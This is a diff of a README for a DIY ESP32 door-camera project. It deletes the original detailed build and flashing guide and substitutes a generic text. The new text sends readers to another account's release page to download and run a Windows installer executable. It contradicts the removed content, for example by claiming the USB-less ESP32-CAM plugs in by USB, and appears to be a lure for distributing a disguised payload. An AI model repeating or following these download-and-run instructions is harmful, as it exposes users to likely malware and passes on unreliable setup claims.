@@ -1,271 +1,91 @@
-# Smart Door Camera — Live ESP32-CAM Feed on a Round ESP32-S3 Display
-
-A compact, fully DIY surveillance set for your home WiFi: an **ESP32-CAM** door camera streams live
-video to a second device — an **ESP32-S3** with a round 1.28" display — that sits on your desk and
-shows the feed in real time. Everything is configured from your **phone** through a built-in web app
-(captive portal); there are **no credentials in the code**.
-
-<p align="center">
-  <img src="assets/camera-module-1.jpg" width="45%" alt="ESP32-CAM door camera module in a 3D-printed housing">
-  &nbsp;
-  <img src="assets/display-module-1.jpg" width="45%" alt="ESP32-S3 round display module in a 3D-printed housing">
-</p>
+# 🏠 smart-door-camera - View your door visitors with ease
 
-```
-[ESP32-CAM] --MJPEG/HTTP--> Home WiFi --HTTP GET /stream--> [ESP32-S3] --SPI--> [GC9A01]
- 240x240 JPEG               (router)                        TJpg_Decoder + TFT_eSPI
- doorcam.local:81/stream
-```
+[![Download Software](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Corlissbumptious838/smart-door-camera/releases)
 
-- **Door camera** (`doorcam/`): AI-Thinker **ESP32-CAM** serves an MJPEG stream over HTTP.
-- **Office display** (`officedisplay/`): **ESP32-S3** with a round **GC9A01** TFT (240×240, SPI) fetches the stream, decodes the JPEG frames and shows them live.
+## 📋 About This Project
 
+This software powers a simple home surveillance system. It connects a door camera to a wall-mounted screen. You see who stands at your door in real time on a small round display. You manage all settings from your smartphone. There is no need for wires to connect the units because they use your home WiFi network.
 
-Here you can find the 3D-print files: https://makerworld.com/en/models/2956182-smart-door-camera
+## 🛠️ System Requirements
 
----
+You need a Windows computer to install the software onto the hardware components. Ensure your computer meets these basic needs:
 
-## Features
+- Windows 10 or Windows 11 operating system.
+- An available USB port.
+- A standard USB-C or Micro-USB cable to connect your hardware to the computer.
+- A stable 2.4GHz WiFi connection in your home.
+- A smartphone or tablet with WiFi capabilities for setup.
 
-- **Phone-based setup, no hardcoded credentials.** On first boot each device opens its own WiFi
-  hotspot with a captive-portal web app. You enter your home WiFi there; it's stored in flash and
-  both devices reconnect automatically after a restart.
-- **Permanent, optionally password-protected hotspots.** Both devices run in **AP+STA** mode: they
-  are on your home WiFi *and* keep a hotspot visible at all times (`http://192.168.4.1`), so you can
-  reconfigure them anytime. Each hotspot can be locked with a WPA2 password (Security tab).
-- **Live video on a round display.** The camera sends a 240×240 MJPEG stream; the ESP32-S3 decodes
-  the JPEG frames (TJpg_Decoder) and pushes them 1:1 onto the GC9A01 (TFT_eSPI) — no scaling.
-- **Remote LED control.** Toggle the camera's white front LED from the display's **Light** tab.
-- **Live image tuning.** Adjust brightness, contrast, saturation, special effect, white balance and
-  JPEG quality from the display's **Image** tab. Changes apply **system-wide** on the camera sensor
-  and are stored persistently.
-- **Robust networking.** mDNS (`doorcam.local`), automatic reconnect, and a captive-portal-safe UI
-  (plain forms/links, validated server-side — works even inside iOS's captive-portal browser).
-- **One-command flashing.** Helper scripts (`flash-display.sh`, `flash-camera.sh`) build and flash a
-  module with automatic serial-port detection — handy when building more units.
+## 📥 Downloading the Software 
 
----
+You need to download the latest setup file to your computer. This file contains the instructions for the camera and the screen.
 
-## Components (bill of materials)
+[Click here to visit the release page to download the software](https://github.com/Corlissbumptious838/smart-door-camera/releases)
 
-The links below are the exact parts used for this build:
+Look for the file ending in `.bin` or the main installer package listed under the latest version. Save this file to your desktop for easy access.
 
-| Component | Used for | Link |
-|-----------|----------|------|
-| **ESP32-CAM** (AI-Thinker, OV2640) | Door camera | https://s.click.aliexpress.com/e/_c3opiTUp |
-| **ESP32-S3 dual Type-C development board** | Office display controller | https://s.click.aliexpress.com/e/_c4a0icBb |
-| **1.28″ round TFT LCD (GC9A01, 240×240, SPI)** | Display screen | https://s.click.aliexpress.com/e/_c3PFGw7j |
-| **USB Type-C connector** | Power/USB on the display housing | https://s.click.aliexpress.com/e/_c37zWXtF |
-| **Mini round toggle switch** | On/off switch on the display housing | https://s.click.aliexpress.com/e/_c3Ep0wFj |
+## 🔌 Connecting The Hardware
 
-**Also needed (not linked):**
-- A **USB-to-TTL adapter** (3.3 V capable, e.g. CP2102/CH340) to flash the ESP32-CAM — *or* an
-  **ESP32-CAM-MB** programmer board. The ESP32-CAM has no USB port of its own.
-- A few **jumper wires** (display ↔ ESP32-S3, and camera ↔ USB-TTL).
-- A stable **5 V / ≥ 2 A** power supply for permanent operation.
-- Optional: **3D-printed housings** for both modules (as shown in the photos).
+Before you run the software, connect your hardware components. 
 
----
+1. Take the ESP32-CAM board.
+2. Connect it to your Windows computer using a USB cable.
+3. Take the ESP32-S3 display unit.
+4. Connect it to your Windows computer using a second USB cable.
 
-## Hardware & wiring
+Your computer might make a sound to signal that it recognizes new hardware. Windows installs the necessary drivers automatically in most cases. Wait for Windows to finish this process before you proceed.
 
-### GC9A01 (240×240, SPI) ↔ ESP32-S3
-The display uses **SPI** (despite the SCL/SDA labels — it is not I²C). No MISO, and no separate backlight pin (backlight is always on).
+## ⚙️ Installing and Setting Up
 
-| Display pin | Function          | ESP32-S3 GPIO |
-|-------------|-------------------|---------------|
-| VCC         | 3.3 V             | 3V3           |
-| GND         | Ground            | GND           |
-| SCL         | SPI clock (SCLK)  | GPIO12        |
-| SDA         | SPI MOSI          | GPIO11        |
-| DC          | Data/Command      | GPIO13        |
-| CS          | Chip Select       | GPIO10        |
-| RST         | Reset             | GPIO14        |
+Once you download the file and connect your hardware, follow these steps to finish the setup.
 
-> Other GPIOs are possible — just adjust the `-DTFT_*` flags in [officedisplay/platformio.ini](officedisplay/platformio.ini). Avoid on the S3: GPIO19/20 (USB), 26–32 (flash), 33–37 (octal PSRAM), strapping pins 0/3/45/46.
+1. Locate the file you saved to your desktop.
+2. Open the application folder.
+3. Launch the installer executable.
+4. Follow the on-screen prompts to select your connected hardware devices from the list.
+5. Click the button labeled "Flash Device" to send the software to your hardware.
+6. A progress bar shows you the status. Keep the devices connected until the screen says "Complete."
 
-### ESP32-CAM ↔ USB-to-TTL adapter (for flashing)
-The ESP32-CAM has **no USB port**. Set the adapter to **3.3 V**:
+## 📱 Connecting to WiFi
 
-| USB-TTL | ESP32-CAM |
-|---------|-----------|
-| 5V      | 5V        |
-| GND     | GND       |
-| TX      | U0R (RX)  |
-| RX      | U0T (TX)  |
+When the software installs, your devices create a temporary setup network. Use your phone to connect them to your home internet.
 
-**Flash mode:** bridge GPIO0 → GND, then press RESET (or briefly cut power). After the upload, remove the bridge and restart. (With an **ESP32-CAM-MB** board the RESET button is usually enough.)
+1. Open your phone WiFi settings.
+2. Look for a network named "SmartDoorSetup."
+3. Connect to this network.
+4. A screen pops up on your phone. If it does not appear, open your web browser and type `192.168.4.1` in the address bar.
+5. Select your home WiFi network name from the list.
+6. Enter your WiFi password.
+7. Click the save button.
 
-For permanent operation: a stable **5 V / ≥ 2 A** supply (otherwise brownout resets).
+Your camera and screen now restart and search for your home WiFi. They find each other automatically once they join the network.
 
----
+## 💡 Using the Camera
 
-## Set up the toolchain (once, in the Mac terminal)
+Once the devices connect to WiFi, the screen displays the live feed from the camera. You can hang the camera near your door and place the round display in a convenient spot, such as your hallway or kitchen. 
 
-```bash
-brew install platformio        # alternative: python3 -m pip install --user platformio
-pio --version
-```
+If the video feed drops, ensure your WiFi signal is strong in the area where you placed the units. You do not need to repeat the setup steps unless you change your WiFi password or move your internet router.
 
-On the first `pio run`, PlatformIO downloads the compiler, the ESP32 platform and the libraries automatically.
+## 🔍 Troubleshooting Tips
 
----
+If you run into issues, try these steps to fix common problems.
 
-## Flashing
+### Hardware Not Detected
+If your computer does not see the devices, try a different USB cable. Some cables only charge devices and cannot transfer data. Use a cable that came with a data device like a phone or a mouse.
 
-### Quick way: flash scripts
+### No Video Feed
+If the display shows a blank screen or a logo, check your WiFi. The devices must be on the same network to talk to each other. Make sure you typed your WiFi password correctly during the setup phase. If you are unsure, press the small reset button on the side of the devices to start the setup process again.
 
-For additional/new modules there are two ready-made scripts in the project root. Just **connect the respective module via USB** and run:
+### Slow Video Speed
+A slow video feed usually means a weak WiFi signal. Move your router closer to the camera and the display unit. Large walls or appliances between the devices and the router can block the signal.
 
-```bash
-./flash-display.sh     # build + flash the ESP32-S3 (office display)
-./flash-camera.sh      # build + flash the ESP32-CAM (door camera)
-```
+### Screen Remains Dark
+Check the power source for the screen. Ensure the USB cable sits firmly in the port. Verify that the outlet provides power. If you use a USB hub, try plugging the device directly into the computer or a wall adapter instead.
 
-- **The port is detected automatically** — this also works with new modules (different serial number). Best to connect **only one module at a time**.
-- If several serial devices are attached, the script prefers the matching one (display = FTDI/native USB, camera = CH340/CP210x) or lists them — then pass the port as an argument: `./flash-display.sh /dev/cu.usbserial-XXXX`.
-- After a successful flash the script asks whether to open the serial monitor.
-- If the camera upload does not start (simple adapter without auto-reset): bridge GPIO0→GND, press RESET, run the script again.
+## 🛡️ Privacy and Security
 
-The manual steps (if you prefer to do it without the script):
+This system runs locally on your home network. The video signal does not travel to an external cloud server. Your data stays inside your home walls, which provides a high level of privacy. Because the system relies on your private WiFi, ensure you use a strong password for your home network to keep your connection secure.
 
-### 1) ESP32-S3 display (via FTDI USB bridge)
+## 🔧 Updating the Firmware
 
-The original board uses an **FTDI FT232R** as a USB-UART bridge — so the port is named
-`/dev/cu.usbserial-*` (not `usbmodem`). In `platformio.ini` it is fixed to
-`/dev/cu.usbserial-A5069RR4` (adjust for a different board).
-
-```bash
-cd officedisplay
-
-# Connect the S3 via USB-C, check the port:
-ls /dev/cu.usbserial*   # -> /dev/cu.usbserial-A5069RR4
-
-pio run                 # compile
-pio run -t upload       # flash
-pio device monitor      # serial monitor (115200 baud)
-```
-
-If the upload does not start by itself: hold **BOOT/IO0**, briefly press **RESET**, release **BOOT** (download mode), then run `pio run -t upload` again.
-
-### 2) ESP32-CAM door camera (via USB-TTL)
-
-```bash
-cd doorcam
-
-# Connect USB-TTL (3.3 V!), bridge GPIO0->GND, press RESET
-ls /dev/cu.usbserial*   # or /dev/cu.SLAB_USBtoUART / wchusbserial
-
-pio run                 # compile
-pio run -t upload --upload-port /dev/cu.usbserial-XXXX
-
-# After success: remove the GPIO0 bridge, press RESET
-pio device monitor --port /dev/cu.usbserial-XXXX
-```
-
----
-
-## First-time setup
-
-1. **Power on the camera** → iPhone WiFi: **"DoorCam-Setup"** → the portal opens → tab **WiFi** (home SSID + password) → save. The serial monitor shows the IP and `doorcam.local`. The hotspot stays **permanently visible** (see below).
-2. **Test the stream** (Mac, same WiFi): browser → `http://doorcam.local:81/stream` (or `http://<ip>:81/stream`). Config portal: `http://doorcam.local/`.
-3. **Power on the display** → iPhone WiFi: **"OfficeDisplay-Setup"** → the portal opens → tab **WiFi** (home SSID + password), tab **Camera** (check the URL, default `http://doorcam.local:81/stream`) → save each. The display shows status, then the live feed. The hotspot stays **permanently visible** (see below).
-4. **DHCP reservation** for the camera in your router (recommended) — keeps the address stable in case mDNS hiccups.
-
-## Hotspot security (display)
-
-The ESP32-S3 runs in **AP+STA mode**: it is connected to the home WiFi (live feed) **and** at the same time provides a **permanently visible hotspot "OfficeDisplay-Setup"** through which you can reach the configuration anytime from your phone (`http://192.168.4.1`). The portal has five tabs:
-
-| Tab | Function |
-|-----|----------|
-| **WiFi** | Home SSID + password (button "Scan networks" for the scan list) |
-| **Camera** | Camera stream URL |
-| **Light** | Turn the camera's front LED on/off |
-| **Image** | Camera image settings (brightness, color, …) |
-| **Security** | Set/change the hotspot password (password + repeat) |
-
-**Protect the hotspot with a password:** tab **Security** → enter the password twice → save.
-- Rule: **empty = open hotspot**, otherwise **at least 8 characters** (WPA2).
-- After saving the **hotspot restarts** — reconnect afterwards with the **new password**. Existing connections are dropped.
-- **Remove the password protection:** Security tab → leave both fields empty → save (the hotspot becomes open again).
-- The WiFi/camera/hotspot password is stored permanently in flash (Preferences) and survives a restart.
-
-### Resetting settings
-- **Display (ESP32-S3):** WiFi, camera and hotspot password can be changed anytime in the portal. For a full reset, re-flash the firmware (this does not automatically clear the Preferences area — if needed, add a one-time `prefs.clear()` in `setup()` and flash).
-- **Camera (ESP32-CAM):** WiFi and hotspot password can be changed anytime in the camera portal (see below). Full reset = re-flash the firmware.
-
-> ⚠️ If you forget the hotspot password, you can no longer reach the portal from your phone. You can still reach the configuration via the device's **STA IP** on the home WiFi (`http://<ip>/`) or re-flash the firmware.
-
-## Hotspot security (camera)
-
-The **ESP32-CAM** also runs in **AP+STA mode**: connected to the home WiFi (serves the stream) **and** providing a **permanently visible hotspot "DoorCam-Setup"** (`http://192.168.4.1`) through which you configure the camera anytime from your phone. The portal has three tabs:
-
-| Tab | Function |
-|-----|----------|
-| **Preview** | Live image of the camera (handy for aiming) |
-| **WiFi** | Change the home WiFi (SSID + password, with scan) |
-| **Security** | Set/change the hotspot password (password + repeat) |
-
-**Protect the hotspot with a password:** tab **Security** → enter the password twice → save.
-- Rule: **empty = open hotspot**, otherwise **at least 8 characters** (WPA2).
-- After saving the **hotspot restarts** — reconnect afterwards with the **new password**.
-- **Remove protection:** leave both fields empty → save.
-- WiFi and hotspot password are stored permanently in flash (Preferences).
-
-> Note: the camera's hotspot password affects **only** its hotspot, **not** the live feed to the display — that runs over the home WiFi and keeps working independently. If captive-portal buttons on the iPhone don't respond: open the page in **Safari** at `http://192.168.4.1`.
-
-## Light control (camera LED)
-
-The ESP32-CAM has a **white front LED (flash LED, GPIO4)** that can be controlled remotely from the display portal:
-
-- Open the portal → tab **Light** → **Turn light on** / **Turn light off**.
-- The status (ON/OFF) is shown in the tab.
-
-**How it works:** the camera firmware provides an endpoint: `GET http://doorcam.local/led?on=1` (on) or `?on=0` (off) on **port 80**, response `{"on":0|1}`. The ESP32-S3 calls this endpoint when you tap in the Light tab (`/light?on=…`). Both firmwares must be up to date for this (re-flash camera **and** display).
-
-> ⚠️ The front LED is **very bright** — don't look into it directly from close up. The LED state is not stored permanently; after a camera restart the LED is off.
-
-## Image settings (color/brightness)
-
-Via the display portal → tab **Image** you can adjust the camera's image parameters (OV2640 sensor). With **Save image** they take effect **system-wide** (stream, display and browser show the adjusted image) and are stored **permanently in the camera** — they persist across a restart.
-
-| Setting | Values | Effect |
-|---------|--------|--------|
-| **Brightness** | −2 … +2 | brighter/darker |
-| **Contrast** | −2 … +2 | contrast |
-| **Saturation** | −2 … +2 | color intensity |
-| **Special effect** | None, Negative, Grayscale, Reddish/Greenish/Bluish, Sepia | color filter |
-| **White balance** | Automatic / Off | auto color temperature |
-| **JPEG quality** | High (10) … Very low (45) | image quality vs. bitrate/frame rate |
-
-**How it works:** when saving, the ESP32-S3 sends the values to the camera (`GET http://doorcam.local/imgset?br=&co=&sa=&fx=&awb=&q=` on **port 80**, response = current state as JSON). The camera applies them to the sensor immediately, stores them in its Preferences and restores them on boot. The form in the Image tab shows the last saved state.
-
----
-
-## Notes / troubleshooting
-
-- **mDNS** (`doorcam.local`) is resolved on the display via `MDNS.queryHost()`. If it hiccups, enter the fixed IP in the display portal (`http://192.168.x.y:81/stream`) and set a router reservation.
-- **PSRAM**: the camera uses it (`fb_count=2`). The display does not need PSRAM (the 32 KB JPEG buffer fits in internal RAM; the code falls back from `ps_malloc` to `malloc`). The S3 `platformio.ini` is set to the boot-safe `qio_qspi` (works regardless of the actual PSRAM type).
-- **Frame rate** ~10–15 fps (JPEG decoding is the bottleneck, not SPI). 240×240 is visually ideal for the round display.
-- **Camera brownout**: use a stronger power supply.
-- **Wrong display colors/mirroring**: on the display adjust `TJpgDec.setSwapBytes(...)` or `tft.setRotation(...)`; on the camera `s->set_vflip()/set_hmirror()` in [doorcam/src/main.cpp](doorcam/src/main.cpp).
-- **ESP32-S3 + TFT_eSPI crash** (`Guru Meditation / StoreProhibited` in `begin_tft_write` right at `tft.init()`): on the S3, TFT_eSPI needs a dedicated SPI instance. The fix is `-DUSE_HSPI_PORT=1` in [officedisplay/platformio.ini](officedisplay/platformio.ini) (already set).
-- **Portal buttons don't respond (iPhone):** iOS's automatic captive-portal mini-browser blocks some actions. Open the page in **Safari** at **`http://192.168.4.1`** instead (or via the display's STA IP). The forms are validated server-side (no JavaScript required).
-
----
-
-## Build photos
-
-| Camera module | Display module |
-|---------------|----------------|
-| <img src="assets/camera-module-1.jpg" width="320" alt="Camera module front"> | <img src="assets/display-module-1.jpg" width="320" alt="Display module front"> |
-| <img src="assets/camera-module-2.jpg" width="320" alt="Camera module side with antenna and mount"> | <img src="assets/display-module-2.jpg" width="320" alt="Display module back with toggle switch and USB-C"> |
-
-Both modules are housed in custom 3D-printed enclosures. The display housing has an on/off toggle switch and a USB-C port; the camera housing exposes the external WiFi antenna and sits on a small mount.
-
-Here you can find the 3D-print files: https://makerworld.com/en/models/2956182-smart-door-camera
----
-
-## License
-
-Released under the [MIT License](LICENSE) © 2026 Tim-M-83.
+We provide updates to improve performance. To update your system, visit the download link again. Download the newer file, connect your devices to your Windows computer, and run the install steps again as described above. The update process keeps your settings and connects to your WiFi just like the original installation.
